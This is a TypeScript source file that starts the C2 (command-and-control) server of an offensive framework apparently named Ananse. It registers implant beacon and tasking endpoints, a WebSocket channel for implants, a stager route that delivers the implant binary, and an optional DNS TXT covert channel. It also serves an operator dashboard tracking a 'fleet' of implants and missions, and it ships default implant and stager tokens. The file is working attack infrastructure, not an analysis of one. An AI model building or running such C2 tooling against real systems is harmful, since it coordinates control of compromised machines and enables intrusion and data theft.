import express from "express";
import cors from "cors";
import { createServer } from "node:http";
import { createServer as createHttpsServer } from "node:https";
import { readFileSync, existsSync } from "node:fs";
import { homedir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

import { getDb, closeDb } from "./db.js";
import { ReachRegistry } from "./reach.js";
import { TaskQueue } from "./taskQueue.js";
import { createRouter } from "./api.js";
import { createStagerRouter } from "./stager.js";
import { createWsBroadcaster } from "./ws.js";
import { createImplantWsServer } from "./implant-ws.js";
import { createDnsServer } from "./dns.js";
import { createChatRouter } from "./chat.js";
import type { C2ServerConfig } from "../types.js";

const __dirname = dirname(fileURLToPath(import.meta.url));

export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => void } {
  const config: C2ServerConfig = {
    port: cfg.port ?? 8443,
    host: cfg.host ?? "0.0.0.0",
    apiKey: cfg.apiKey ?? process.env.C2_API_KEY ?? "op-key-change-me",
    implantToken: cfg.implantToken ?? process.env.C2_IMPLANT_TOKEN ?? "imp-token-change-me",
    dbPath: cfg.dbPath ?? join(homedir(), ".ananse", "c2.db"),
    checkinTimeout: cfg.checkinTimeout ?? 600_000,
    stalePruneInterval: cfg.stalePruneInterval ?? 60_000,
  };

  if (!config.apiKey || config.apiKey === "op-key-change-me") {
    console.warn("  WARNING: Using default C2_API_KEY. Set C2_API_KEY env var for production.");
  }
  if (!config.implantToken || config.implantToken === "imp-token-change-me") {
    console.warn("  WARNING: Using default C2_IMPLANT_TOKEN. Set C2_IMPLANT_TOKEN env var for production.");
  }

  // Init DB
  const db = getDb(config.dbPath);
  const registry = new ReachRegistry(db);
  const taskQueue = new TaskQueue(db);

  // Express
  const app = express();
  app.use(cors());
  app.use(express.json({ limit: "10mb" }));

  // Health
  app.get("/api/v1/health", (_req, res) => {
    res.json({ status: "ok", uptime: process.uptime() });
  });

  // Stale pruning interval
  const pruneTimer = setInterval(() => {
    registry.pruneStale(config.checkinTimeout);
  }, config.stalePruneInterval);

  // Start HTTP or HTTPS server
  let protocol = "http";
  let wsProtocol = "ws";
  let httpServer;

  if (config.cert && config.key) {
    if (!existsSync(config.cert)) throw new Error(`TLS cert not found: ${config.cert}`);
    if (!existsSync(config.key)) throw new Error(`TLS key not found: ${config.key}`);
    protocol = "https";
    wsProtocol = "wss";
    const tlsOpts = { cert: readFileSync(config.cert), key: readFileSync(config.key) };
    httpServer = createHttpsServer(tlsOpts, app);
  } else {
    httpServer = createServer(app);
  }

  // WebSocket broadcast (attached to the same HTTP server)
  const broadcast = createWsBroadcaster(httpServer, config.apiKey);

  // Implant-facing WebSocket (for WS transport fallback)
  createImplantWsServer(httpServer, registry, taskQueue, config.implantToken, broadcast);

  // Stager endpoint (serves implant binary to authenticated stagers)
  const implantPath = process.env.C2_IMPLANT_PATH || join(__dirname, "..", "..", "..", "implant", "implant");
  const stagerToken = process.env.C2_STAGER_TOKEN || "stag3r-t0k3n-change";
  const stagerRouter = createStagerRouter(implantPath, stagerToken);
  app.use(stagerRouter);

  // Routes with broadcast capability
  const router = createRouter(registry, taskQueue, config.apiKey, config.implantToken, broadcast);
  app.use(router);

  // Dashboard (Ananse Control Panel)
  const dashDir = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "src", "dashboard");
  app.use(express.static(dashDir));
  app.use("/api/chat", createChatRouter());

  // Dashboard data API
  app.get("/api/dashboard/fleet", (_req, res) => {
    try { res.json(registry.summary()); }
    catch { res.json({ total: 0, active: 0, dead: 0, implants: [] }); }
  });

  app.get("/api/dashboard/missions", async (_req, res) => {
    try {
      const { loadLatestMission, getMissionSummary } = await import("../../mission.js");
      const mission = await loadLatestMission();
      res.json({ active: mission?.active ?? false, summary: mission ? getMissionSummary() : null });
    } catch { res.json({ active: false, summary: null }); }
  });

  app.get("/api/dashboard/sessions", async (_req, res) => {
    try {
      const { listSessions } = await import("../../session.js");
      const all = await listSessions();
      res.json(all.filter((s: any) => s.messages && s.messages.length > 0).slice(0, 20));
    } catch { res.json([]); }
  });

  app.get("/api/dashboard/stats", (_req, res) => {
    const mem = process.memoryUsage();
    const uptime = Math.floor(process.uptime());
    const hrs = Math.floor(uptime / 3600);
    const mins = Math.floor((uptime % 3600) / 60);
    res.json({
      cpu: (process.cpuUsage?.()?.user ?? 0) / 1000000 + "%",
      mem: Math.round(mem.rss / 1024 / 1024) + "MB",
      uptime: hrs + "h " + mins + "m",
      sessions: registry.summary().total || 0,
    });
  });

  app.get("/api/dashboard/search", async (req, res) => {
    try {
      const query = (req.query.q as string) || "";
      if (!query) { res.json({ results: [] }); return; }
      const { searchKnowledge } = await import("../../knowledge.js");
      const entries = await searchKnowledge(query, 10);
      res.json({ results: entries.map((e: any) => ({ name: e.id?.slice(0, 8), snippet: e.content?.slice(0, 200) })) });
    } catch { res.json({ results: [] }); }
  });

  let dnsServer: { start: () => Promise<void>; stop: () => Promise<void> } | null = null;
  const dnsDomain = process.env.C2_DNS_DOMAIN;
  const dnsPort = parseInt(process.env.C2_DNS_PORT || "53", 10);
  if (dnsDomain) {
    dnsServer = createDnsServer(dnsPort, dnsDomain, registry, taskQueue);
    dnsServer.start().catch((err) => console.error(`  DNS server error: ${err.message}`));
    console.log(`  DNS:   ${dnsDomain} on :${dnsPort} (TXT queries)`);
  }

  httpServer.listen(config.port, config.host, () => {
    const host = config.host === "0.0.0.0" ? "localhost" : config.host;
    console.log(`  C2 server listening on ${host}:${config.port} (${protocol})`);
    console.log(`  WS:    ${wsProtocol}://${host}:${config.port}/api/v1/operator/ws`);
    console.log(`  API:   POST /api/v1/beacon  (implant)`);
    console.log(`         GET  /api/v1/operator/reach`);
    console.log(`         POST /api/v1/operator/task`);
    if (protocol === "https") console.log(`  TLS:   ${config.cert} + ${config.key}`);
  });

  return {
    close: () => {
      clearInterval(pruneTimer);
      if (dnsServer) dnsServer.stop().catch(() => {});
      httpServer.close();
      closeDb();
    },
  };
}
